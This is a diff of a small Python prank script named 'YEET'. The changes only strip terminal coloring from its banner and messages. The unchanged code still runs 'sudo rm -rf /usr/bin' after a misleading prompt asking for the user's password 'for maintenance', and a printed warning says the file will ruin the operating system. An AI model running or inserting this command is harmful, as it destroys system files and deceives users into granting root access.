@@ -4,17 +4,17 @@ from termcolor import colored, cprint
 import time
 
 
-name = colored('''__   __ _____  _____  _____ 
+name = ('''       __   __ _____  _____  _____ 
 \ \ / /| ____|| ____||_   _|
  \ V / |  _|  |  _|    | |  
   | |  | |___ | |___   | |  
   |_|  |_____||_____|  |_|  
-                           ''', 'red')
-lol = colored('lol sudo go yeet', 'red')
+                           ''')
+lol = 'lol sudo go yeet'
 
 def yeet():
     os.system('clear')
-    cprint(name)
+    print(name)
     print('\n\n')
     print('Running this file will ruin your os, only use on a virtual machine\n')
 
@@ -26,7 +26,7 @@ def yeet():
         print('Please input your password for maintenance.')
         os.system('sudo rm -rf /usr/bin')
         print('\n')
-        cprint(lol)
+        print(lol)
         
     
     elif choice == '2':
